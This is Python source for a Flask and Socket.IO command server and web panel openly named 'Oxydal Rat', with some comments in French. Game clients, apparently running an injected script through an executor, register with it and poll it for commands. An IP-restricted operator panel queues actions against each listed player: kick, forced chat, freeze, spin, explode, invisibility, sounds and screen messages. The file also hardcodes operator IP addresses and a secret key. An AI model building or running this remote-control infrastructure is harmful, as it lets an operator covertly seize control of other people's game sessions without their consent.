from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO
import time
import eventlet

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "oxydal_ultra_secret"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# Garde tes IPs ici
ALLOWED_IPS = {"37.66.149.36", "91.170.86.224", "127.0.0.1"}

connected_players = {}
pending_commands = {}

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip: ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS: abort(403)

@app.before_request
def protect():
    if request.path in ["/", "/troll", "/kick"]: check_ip()

HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Oxydal Rat | Full Panel</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Inter:wght@400;600&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Inter,sans-serif;background:radial-gradient(circle at top,#0f2027,#000);color:#fff;min-height:100vh;display:flex;overflow:hidden}
.sidebar {width:260px; background:rgba(10,10,10,0.95); border-right:1px solid #333; display:flex; flex-direction:column; padding:25px; z-index:100}
.sidebar h2 {font-family:Orbitron; color:#00ffaa; font-size:1.4rem; margin-bottom:40px; text-align:center; text-shadow:0 0 10px #00ffaa}
.nav-btn {background:none; border:none; color:#aaa; padding:15px; text-align:left; font-size:1.1rem; cursor:pointer; border-radius:12px; margin-bottom:10px; font-weight:600}
.nav-btn.active {background:rgba(0,255,170,0.1); color:#00ffaa; border-left:4px solid #00ffaa}
.main-content {flex:1; overflow-y:auto; padding:40px}
.page {display:none}
.page.active {display:block}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(380px,1fr));gap:25px}
.card{background:rgba(20,20,20,.9);border-radius:18px;padding:25px;border:1px solid #333;box-shadow:0 10px 30px rgba(0,0,0,0.5)}
.name{font-size:1.6rem;color:#ffcc00;margin-bottom:5px;font-family:Orbitron}
.info{font-size:0.9rem;color:#aaa;margin-bottom:20px;line-height:1.4}
.category{font-weight:bold;color:#00ffaa;margin:15px 0 8px;font-size:0.85rem;text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid #222}
button.btn{padding:10px;border:none;border-radius:8px;cursor:pointer;font-weight:bold;color:white;font-size:0.8rem;transition:0.2s}
button.btn:hover{transform:translateY(-2px); filter:brightness(1.2)}
.modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);align-items:center;justify-content:center;z-index:1000}
.modal.active{display:flex}
.modal-content{background:#111;padding:30px;border-radius:20px;width:400px;border:1px solid #444;text-align:center}
.modal-content input{width:100%;padding:12px;margin:20px 0;background:#222;border:1px solid #444;color:white;border-radius:10px;font-size:1rem}
.history-item {background:rgba(255,255,255,0.03); padding:12px; border-radius:10px; margin-bottom:10px; border-left:4px solid #00ffaa; font-size:0.9rem}
</style>
</head>
<body>
<div class="sidebar">
    <h2>OXYDAL RAT</h2>
    <button class="nav-btn active" onclick="showPage('playersPage', this)">Players</button>
    <button class="nav-btn" onclick="showPage('historyPage', this)">History</button>
</div>
<div class="main-content">
    <div id="playersPage" class="page active">
        <h1 style="font-family:Orbitron; color:#00ffaa; margin-bottom:30px; text-align:center">Control Center</h1>
        <div class="grid" id="players"></div>
    </div>
    <div id="historyPage" class="page">
        <h1 style="font-family:Orbitron; margin-bottom:30px">System Logs</h1>
        <div id="historyList"></div>
    </div>
</div>

<div class="modal" id="msgModal"><div class="modal-content"><h2>Screen Message</h2><input type="text" id="msgText" placeholder="Texte au milieu..."><div style="display:flex;gap:10px"><button class="btn" style="background:#444;flex:1" onclick="closeModal('msgModal')">Cancel</button><button class="btn" style="background:#00ffff;color:#000;flex:1" onclick="submitAction('message', 'msgText', 'msgModal')">Display</button></div></div></div>
<div class="modal" id="chatModal"><div class="modal-content"><h2>Force Chat</h2><input type="text" id="chatText" placeholder="Faire dire au joueur..."><div style="display:flex;gap:10px"><button class="btn" style="background:#444;flex:1" onclick="closeModal('chatModal')">Cancel</button><button class="btn" style="background:#ffcc00;color:#000;flex:1" onclick="submitAction('chat', 'chatText', 'chatModal')">Send Chat</button></div></div></div>
<div class="modal" id="soundModal"><div class="modal-content"><h2>Play Sound</h2><input type="text" id="soundId" placeholder="Asset ID..."><div style="display:flex;gap:10px"><button class="btn" style="background:#444;flex:1" onclick="closeModal('soundModal')">Cancel</button><button class="btn" style="background:orange;flex:1" onclick="submitAction('playsound', 'soundId', 'soundModal')">Play</button></div></div></div>
<div class="modal" id="kickModal"><div class="modal-content"><h2>Kick Player</h2><input type="text" id="kickReason" placeholder="Raison..."><div style="display:flex;gap:10px"><button class="btn" style="background:#444;flex:1" onclick="closeModal('kickModal')">Cancel</button><button class="btn" style="background:#ff3366;flex:1" onclick="submitAction('kick', 'kickReason', 'kickModal')">Kick</button></div></div></div>

<script>
const socket = io();
let currentUid = null;

function showPage(p, b) {
    document.querySelectorAll('.page').forEach(x => x.classList.remove('active'));
    document.querySelectorAll('.nav-btn').forEach(x => x.classList.remove('active'));
    document.getElementById(p).classList.add('active');
    b.classList.add('active');
}

function openModal(m, id) { currentUid = id; document.getElementById(m).classList.add('active'); }
function closeModal(m) { document.getElementById(m).classList.remove('active'); }

function submitAction(cmd, inputId, modalId) {
    const val = document.getElementById(inputId).value;
    sendTroll(currentUid, cmd, val);
    closeModal(modalId);
    document.getElementById(inputId).value = "";
}

function sendTroll(id, cmd, asset = null) {
    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: id, cmd: cmd, assetId: asset})});
}

function render(data) {
    const grid = document.getElementById("players");
    grid.innerHTML = "";
    Object.entries(data.players).forEach(([id, p]) => {
        const card = document.createElement("div");
        card.className = "card";
        card.innerHTML = `
            <div class="name">${p.username}</div>
            <div class="info">Executor: ${p.executor}<br>Game: ${p.game}</div>
            
            <div class="category">COMMUNICATION</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
                <button class="btn" style="background:#00ffff;color:#000" onclick="openModal('msgModal','${id}')">SCREEN MSG</button>
                <button class="btn" style="background:#ffcc00;color:#000" onclick="openModal('chatModal','${id}')">SEND CHAT</button>
            </div>

            <div class="category">TROLLS</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
                <button class="btn" style="background:#ff3366" onclick="openModal('kickModal','${id}')">KICK</button>
                <button class="btn" style="background:#ff00ff" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                <button class="btn" style="background:#00ffff;color:#000" onclick="sendTroll('${id}','spin')">SPIN</button>
                <button class="btn" style="background:#ffff00;color:#000" onclick="sendTroll('${id}','jump')">JUMP</button>
                <button class="btn" style="background:#88ff88;color:#000" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                <button class="btn" style="background:#ff5555" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                <button class="btn" style="background:#5555ff" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
                <button class="btn" style="background:orange" onclick="openModal('soundModal','${id}')">SOUND</button>
            </div>

            <div class="category">UNDO / STOP</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
                <button class="btn" style="background:#444" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
                <button class="btn" style="background:#444" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
                <button class="btn" style="background:#444" onclick="sendTroll('${id}','unrainbow')">STOP RAINBOW</button>
                <button class="btn" style="background:#444" onclick="sendTroll('${id}','uninvisible')">VISIBLE</button>
                <button class="btn" style="background:#444; grid-column: span 2" onclick="sendTroll('${id}','stopsound')">STOP SOUND</button>
            </div>
        `;
        grid.appendChild(card);
    });
}

socket.on("update", render);
socket.on("log", d => {
    const item = document.createElement("div");
    item.className = "history-item";
    item.textContent = `[${new Date().toLocaleTimeString()}] ${d.msg}`;
    document.getElementById("historyList").prepend(item);
});
</script>
</body>
</html>"""

@app.route("/")
def index(): return render_template_string(HTML)

@app.route("/api", methods=["GET", "POST"])
def api():
    if request.method == "POST":
        d = request.get_json(silent=True) or {}
        uid = str(d.get("userid", ""))
        if d.get("action") == "register":
            connected_players[uid] = {"username": d.get("username"), "executor": d.get("executor"), "game": d.get("game"), "last": time.time()}
        elif d.get("action") == "heartbeat":
            if uid in connected_players: connected_players[uid]["last"] = time.time()
        return jsonify({"ok": True})
    
    uid = str(request.args.get("userid", ""))
    if uid in pending_commands:
        return jsonify(pending_commands.pop(uid))
    return jsonify({})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    d = request.get_json()
    uid, cmd, asset = str(d.get("userid")), d.get("cmd"), d.get("assetId")
    pending_commands[uid] = {"command": cmd, "assetId": asset}
    socketio.emit("log", {"msg": f"{cmd.upper()} -> {uid} ({asset or ''})"})
    return jsonify({"ok": True})

def cleanup():
    while True:
        now = time.time()
        to_del = [u for u,p in connected_players.items() if now - p["last"] > 25]
        for u in to_del: del connected_players[u]
        socketio.emit("update", {"players": connected_players})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(cleanup)
    socketio.run(app, host="0.0.0.0", port=5000)
